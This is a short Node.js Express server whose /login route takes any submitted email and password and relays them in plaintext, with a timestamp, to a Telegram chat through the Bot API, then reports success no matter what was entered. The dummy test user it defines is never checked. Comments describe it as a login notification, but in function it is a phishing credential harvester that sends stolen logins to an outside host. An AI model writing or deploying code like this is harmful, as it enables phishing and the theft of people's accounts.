const express = require("express");
const axios = require("axios");
const cors = require("cors");

const app = express();
app.use(cors());
app.use(express.json());

// 🔑 TELEGRAM CONFIGURATION
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

// 💾 Dummy user for testing
const USER = {
    email: "test@mail.com",
    password: "1234"
};

// Login Route
app.post("/login", async (req, res) => {
    const { email, password } = req.body;

    if (email && password) {
        
        // 🔔 notification telegram 
        const message = `
🔐 New Login Attempt
📧 Email: ${email}
🔑 Password: ${password}
⏰ Time: ${new Date().toLocaleString()}
        `;

        // Send to Telegram via Axios
        try {
            await axios.get(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                params: {
                    chat_id: CHAT_ID,
                    text: message
                }
            });
        } catch (error) {
            console.log("Telegram Error:", error.message);
        }

        return res.json({ success: true });
    }

    return res.json({ success: false, message: "Invalid credentials" });
});

app.listen(3000, () => console.log("Server running on port 3000"));